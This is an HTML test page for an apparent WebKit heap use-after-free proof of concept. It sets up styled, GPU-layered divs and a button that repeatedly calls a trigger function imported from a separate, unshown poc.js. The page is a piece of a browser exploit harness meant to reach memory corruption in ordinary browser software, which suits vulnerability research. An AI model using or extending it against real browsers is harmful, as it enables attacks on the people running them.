<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WebKit UAF PoC - Aggressive</title>
  <style>
    .container {
      overflow: hidden;
      content-visibility: auto;
      transform: translateZ(0);
      position: relative;
      width: 200px;
      height: 200px;
    }
    .child {
      width: 100px;
      height: 100px;
      position: absolute;
      top: 0;
      left: 0;
      background: blue;
      transform: translateZ(0);
    }
    button {
      margin-top: 20px;
      padding: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <h1>UAF: WebKit Heap Use-After-Free (Aggressive)</h1>
  <p>Click to repeatedly trigger the bug and stress the heap.</p>
  <button id="button">Trigger UAF</button>
  <div class="container">
    <div class="child"></div>
  </div>
  <script type="module">
    import { triggerUAFRepeated } from './poc.js';
    document.getElementById('button').addEventListener('click', () => {
      triggerUAFRepeated();
    });
  </script>
</body>
</html>
